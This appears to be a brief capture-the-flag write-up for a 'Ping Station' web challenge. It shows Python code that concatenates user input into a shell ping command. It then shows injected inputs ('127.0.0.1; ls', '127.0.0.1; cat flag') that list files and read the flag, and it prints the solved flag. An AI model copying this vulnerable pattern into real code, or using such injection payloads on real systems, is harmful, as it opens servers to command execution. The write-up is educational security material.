first things first i downloaded app-(1).py
then i opened on the web the instance 34.179.250.187:31276 and noticed on the page:

Ping Station
Insert IP

 _________ ping

 so then i looked at app-(1).py code and this snippet drew my attention:
         ip = request.form['content']
        if (is_valid_ip(ip)==True):
            for i in range(0,2):
                return '<pre>'+subprocess.check_output("ping -c 4 "+ip,shell=True).decode()+'</pre>'
                break

so here i can see that what is send to the server is ping -c 4 + {my input}
so first things first i typed 127.0.0.1; ls in order to execute the command
ping -c 4 127.0.0.1; ls

and then i got this:
app.py
flag
templates

after seeing this i went for 127.0.0.1; cat flag 
in order to execute the command ping -c 4 127.0.0.1; cat flag

so i got the flag:
**ECSC{b1c0bc8e5e1b4c81199ad3c41bef8b69bea3ab86ecfb08c211d90ace0ff98df3}**